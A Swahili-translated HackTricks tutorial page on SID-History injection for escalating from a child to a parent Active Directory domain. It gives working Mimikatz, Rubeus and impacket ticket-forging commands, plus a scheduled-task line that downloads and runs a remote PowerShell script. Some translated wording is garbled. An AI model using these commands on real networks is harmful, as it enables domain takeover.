# SID-History Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## SID History Injection Attack

Lengo la **SID History Injection Attack** ni kusaidia **uhamaji wa watumiaji kati ya maeneo** huku ikihakikisha upatikanaji wa rasilimali kutoka eneo la zamani. Hii inafanywa kwa **kujumuisha Kitambulisho cha Usalama (SID) cha mtumiaji wa zamani katika Historia ya SID** ya akaunti yao mpya. Kwa kuzingatia, mchakato huu unaweza kudhibitiwa ili kutoa upatikanaji usioidhinishwa kwa kuongeza SID ya kundi lenye mamlaka makubwa (kama vile Enterprise Admins au Domain Admins) kutoka eneo la mzazi kwenye Historia ya SID. Ukatili huu unatoa upatikanaji wa rasilimali zote ndani ya eneo la mzazi.

Njia mbili zipo za kutekeleza shambulio hili: kupitia uundaji wa **Golden Ticket** au **Diamond Ticket**.

Ili kubaini SID ya kundi la **"Enterprise Admins"**, mtu lazima kwanza apate SID ya eneo la mzazi. Baada ya kutambua, SID ya kundi la Enterprise Admins inaweza kujengwa kwa kuongeza `-519` kwenye SID ya eneo la mzazi. Kwa mfano, ikiwa SID ya eneo la mzazi ni `S-1-5-21-280534878-1496970234-700767426`, SID inayotokana kwa kundi la "Enterprise Admins" itakuwa `S-1-5-21-280534878-1496970234-700767426-519`.

Unaweza pia kutumia vikundi vya **Domain Admins**, ambavyo vinamalizika kwa **512**.

Njia nyingine ya kupata SID ya kundi la eneo lingine (kwa mfano "Domain Admins") ni kwa:
```powershell
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
### Tiketi ya Dhahabu (Mimikatz) na KRBTGT-AES256

{% code overflow="wrap" %}
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
{% endcode %}

Kwa maelezo zaidi kuhusu tiketi za dhahabu angalia:

{% content-ref url="golden-ticket.md" %}
[golden-ticket.md](golden-ticket.md)
{% endcontent-ref %}

### Tiketi ya Almasi (Rubeus + KRBTGT-AES256)

{% code overflow="wrap" %}
```powershell
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

# Or a ptt with a golden ticket
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt

# You can use "Administrator" as username or any other string
```
{% endcode %}

Kwa maelezo zaidi kuhusu tiketi za almasi angalia:

{% content-ref url="diamond-ticket.md" %}
[tiketi-za-almasi.md](diamond-ticket.md)
{% endcontent-ref %}

{% code overflow="wrap" %}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
{% endcode %}

Pandisha hadi DA wa root au Enterprise admin ukitumia hash ya KRBTGT ya eneo lililoathirika:

{% code overflow="wrap" %}
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
{% endcode %}

Kwa ruhusa zilizopatikana kutoka kwa shambulio unaweza kutekeleza kwa mfano shambulio la DCSync katika eneo jipya:

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

### Kutoka linux

#### Mwongozo na [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)

{% code overflow="wrap" %}
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
{% endcode %}

#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Hii ni skripti ya Impacket ambayo itafanya **kuongeza kutoka kwa domain ya mtoto hadi domain ya mzazi**. Skripti inahitaji:

* Kiongozi wa domain ya lengo
* Akawasilisha kwa mtumiaji wa admin katika domain ya mtoto

Mchakato ni:

* Inapata SID ya kundi la Enterprise Admins la domain ya mzazi
* Inapata hash ya akaunti ya KRBTGT katika domain ya mtoto
* Inaunda Tiketi ya Dhahabu
* Inajiandikisha katika domain ya mzazi
* Inapata akawasilisha kwa akaunti ya Msimamizi katika domain ya mzazi
* Ikiwa swichi ya `target-exec` imeainishwa, inathibitisha kwa Kiongozi wa Domain wa domain ya mzazi kupitia Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## References
* [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
* [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
